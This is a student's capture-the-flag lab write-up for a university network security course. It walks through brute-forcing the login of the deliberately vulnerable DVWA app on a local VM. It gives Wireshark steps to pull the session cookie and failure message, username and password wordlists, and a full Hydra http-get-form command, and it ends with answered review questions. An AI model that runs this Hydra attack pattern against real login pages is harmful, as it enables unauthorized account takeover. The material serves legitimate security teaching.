<p>CNT 4403 <i>Network Security and Firewalls</i></p>
<p>University Of South Florida</p>
<h1>CTF 1: Brute Force Password Attacks</h1>
<b>Tools:</b>
<ul>
    <li><a href="https://www.wireshark.org/download.html">Wireshark</a></li>
    <li><a href="https://github.com/ThurmondGuy/Homework/tree/main/CNT4403/CTF-1%20Brute%20Force%20Password%20Attacks/Hydra">Hydra</a></li>
    <li><a href="https://www.youtube.com/watch?v=GmWQ1VIjd2U">DVWA</a> - (Deployed OVA using <a href="https://www.vmware.com/products/workstation-player.html">VMware</a>)
</ul>

<h2>Overview</h2>
<p>In this exercise, you will be introduced to the basic concepts of 
password cracking. To perform this activity, you will need to 
understand how to obtain the IP address of our DVWA host server, and 
then connect to that server. In this document that server will be 
206
identified as the SUT (System Under Test). We will first log into the 
system using the VMware console, as demonstrated below:</p>
<p align="center">
<img src="https://github.com/ThurmondGuy/Homework/blob/main/CNT4403/CTF-1%20Brute%20Force%20Password%20Attacks/images/image8.png">
</p>
<p>To log into the system, use the username of “<b>ctf</b>” and password of 
“<b>ctf</b>”. This will present you with the login prompt of “ctf@usf-ctf-server:” (note the image above does not reflect the server’s name, but
the default name). It is from here that you can issue the “ifconfig” 
command. Note that the ctf account is a non-privileged account, so you 
will need to use “sudo” to invoke any system commands.</p>

<p>What we want is "ens33 inet addr". This is our "target server". So our target server here is <b>192.168.131.128</b>.</p>

<h2>DVWA</h2>
<p>We are going to need information for our Hydra attack later on:</p>
<ul>
    <li>target server</li>
    <li>cookie</li>
    <li>failure message</li>
</ul>
<p align="center">
<img src="https://github.com/ThurmondGuy/Homework/blob/main/CNT4403/CTF-1%20Brute%20Force%20Password%20Attacks/images/image7.png">
</p>
Login to DVWA, for this page, use the username of <b>"admin"</b>, and the password of <b>"password"</b>.

After logging in, set the Security Level of the web interface to "Low" by navigating to the "DVWA Security" tab on the left-hand panel.
<p align="center">
<img src="https://github.com/ThurmondGuy/Homework/blob/main/CNT4403/CTF-1%20Brute%20Force%20Password%20Attacks/images/image2.png">
</p>
Hit submit to confirm changes.
<h2>Wireshark</h2>
<p>Use Wireshark and watch the traffic that is generated on the 
network, you can then filter out unwanted traffic to only give you the 
information you will need to exploit the system. To perform this 
exercise, start your Wireshark tracing for all traffic on the VMnet1 or 
VMnet8 network, or whatever network interface your IP address for 
your DVWA server IP address network is assigned to. Go ahead and start a wireshark capture.</p>

<p>Now go to the "Brute Force" tab on the left-hand panel and enter an invalid combination. In this case we used "Bill"/"Bill".</p>
<p align="center">
<img src="https://github.com/ThurmondGuy/Homework/blob/main/CNT4403/CTF-1%20Brute%20Force%20Password%20Attacks/images/image6.png">
</p>
<p>Notice the red highlighted text: "Username and/or passowrd incorrect." This is our <b>failure message</b>. Stop the wireshark capture.</p>

<p>Filter the web results from Wireshark, find the "GET" operation on the URL of <b>/dvwa/vulnerabilities/brute</b>.</p>
<p align="center">
<img src="https://github.com/ThurmondGuy/Homework/blob/main/CNT4403/CTF-1%20Brute%20Force%20Password%20Attacks/images/image4.png">
</p>

<p>Analyze the "GET" packet to find the <b>URL</b> and <b>cookie</b>.</p>
<p align="center">
<img src="https://github.com/ThurmondGuy/Homework/blob/main/CNT4403/CTF-1%20Brute%20Force%20Password%20Attacks/images/image9.png">
</p>


```
URL: /dvwa/vulnerabilities/brute/?username=bill&password=bil&Login=Login HTTP/1.1
Cookie: security=low; 
PHPSESSID=n232a3gba8kkd47tai36be0o81
```

<p>We now have enough information for our Hydra attack.

<h2>Hydra Attack</h2>

<b>Target Server:</b>

```
192.168.131.128
```

<b>URL:</b>

```
/dvwa/vulnerabilities/brute/?username=bill&password=bil&Login=Login HTTP/1.1
```

<b>Cookie:</b>

```
security=low; PHPSESSID=n232a3gba8kkd47tai36be0o81
```

<b>Failure Message:</b>

```
Username and/or passowrd incorrect.
```

<p>Create a file named <a href="https://github.com/ThurmondGuy/Homework/blob/main/CNT4403/CTF-1%20Brute%20Force%20Password%20Attacks/Hydra/username.txt">username.txt</a> that contains the following names: alice, bill, bob, ctf, joe, admin, administrator, and root; Each name on a separate single line of the file.</p>

<p>Create a file named <a href="https://github.com/ThurmondGuy/Homework/blob/main/CNT4403/CTF-1%20Brute%20Force%20Password%20Attacks/Hydra/password.txt">password.txt</a> that contains the following passwords: admin, 123456, qwerty, ctf, notpasswrd, password, p@ssw0rd, 219ctivity, root; Each password on a separate single line of the file.</p>

Both files should be in the same <a href="https://github.com/ThurmondGuy/Homework/tree/main/CNT4403/CTF-1%20Brute%20Force%20Password%20Attacks/Hydra">directory</a> as Hydra.

This is the appropriate command for this exercise:

```
hydra -L username.txt -P password.txt 192.168.131.128 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=n232a3gba8kkd47tai36be0o81"
```

If you want to know more about the Hydra syntax, I suggest to check <a href="https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/">this</a>.

<p align="center">
<img src="https://github.com/ThurmondGuy/Homework/blob/main/CNT4403/CTF-1%20Brute%20Force%20Password%20Attacks/images/image5.png">
</p>

Using the information we got from Hydra, login with the user <b>"admin"</b> and the password <b>"password"</b>.

The Brute Force page should now show this:

<p align="center">
<img src="https://github.com/ThurmondGuy/Homework/blob/main/CNT4403/CTF-1%20Brute%20Force%20Password%20Attacks/images/image3.png">
</p>

With the Success Message: "Welcome to the password protected area admin".

<h2>Review</h2>
<details>
<summary>1. Which password cracking tools where used in this exercise to determine the password for root?</summary>
<b>Hydra</b>
</details>
<details>
<summary>2. What are the parameters being passed in the GET request, list only the paremeter names in a comma separated list, for example: x, y</summary><b>username, password, Login</b></details>
<details>
<summary>3. Which header tag in the HTTP request packet contains the session ID?</summary><b>cookie</b></details>
<details><summary>4. What is the name of the session ID used by DVWA (just supply the name, not the value)</summary><b>PHPSESSID</b></details>
<details><summary>5. When using Hydra, to supply a file with a list of usernames, yu would use which switch?</summary><b>-L</b></details>
<details><summary>6. When using Hydra, to supply a file with a list of passwords, you would use which switch?</summary><b>-P</b></details>
<details><summary>7. When using Hydra, which protocol module is used in this exercise?</summary><b>http-get-form</b></details>
<details><summary>8. When using Hydra and specifying an HTTP "GET" request, what toke is used to specify the username?</summary><b>^USER^</b></details>
<details><summary>9. When using Hydra and specifying an HTTP "GET" request, what token is used to specify the password?</summary><b>^PASS^</b></details>
<details><summary>10. When using Hydra and specifying an HTTP "GET" request, what switch is used to specify optional HTTP header tags?</summary><b>:H=</b></details>
<details><summary>11. The username for the password cracking attempt using Hydra is?</summary><b>admin</b></details>
<details><summary>12. The password results of the cracking attempt using Hydra is?</summary><b>password</b></details>
